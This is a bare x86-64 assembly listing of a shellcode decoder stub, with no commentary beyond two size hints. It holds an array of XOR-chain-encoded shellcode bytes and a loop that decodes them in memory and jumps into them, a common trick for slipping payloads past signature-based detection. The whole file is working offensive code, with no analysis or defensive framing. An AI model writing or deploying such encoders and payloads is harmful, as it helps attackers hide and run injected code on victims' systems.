global _start

_start:
    jmp decoder
    encoded_shellcode: db 0xaa, 0x9b,0x5b,0xb,0x5f,0x5,0x4d,0xf3,0xdc,0xbe,0xd7,0xb9,0x96,0xb9,0xca,0xa2,0xf4,0xa0,0xff,0xaf,0xf8,0xac,0xf2,0x42,0x79,0x76,0x73
    shellcode_len: db $ - encoded_shellcode   ; use dw if len(shellcode) > 255

decoder:
    xor ecx, ecx
    lea rdx, [rel shellcode_len]
    mov cl, [rdx]   ; use cx if len(shellcode) > 255
    sub rdx, rcx
    mov al, [rdx]

decoder_loop:
    inc rdx
    xchg [rdx], al
    xor [rdx], al
    loop decoder_loop
    jmp encoded_shellcode + 1
